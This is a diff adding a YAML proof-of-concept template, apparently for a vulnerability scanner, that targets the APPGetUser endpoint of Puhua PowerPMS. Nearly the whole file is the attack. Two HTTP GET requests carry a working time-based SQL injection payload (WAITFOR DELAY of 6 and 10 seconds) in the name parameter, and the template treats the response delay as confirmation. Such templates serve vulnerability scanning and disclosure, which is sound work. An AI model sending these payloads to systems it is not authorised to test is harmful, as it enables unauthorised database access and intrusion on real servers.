@@ -1,0 +1,27 @@
+name: poc-yaml-puhua-PowerPMS-APPGetUser-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: GET
+      path: /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A10%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 10000 && response.latency <= 11000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486023&idx=1&sn=3bd1ffde9c30393b099ac8f7e86f6792&chksm=c267bf74f5103662ada86eec583a96273e6d358845a0f31a23ed3d98553dda5cabf78c837f01&token=2024266625&lang=zh_CN#rd
+
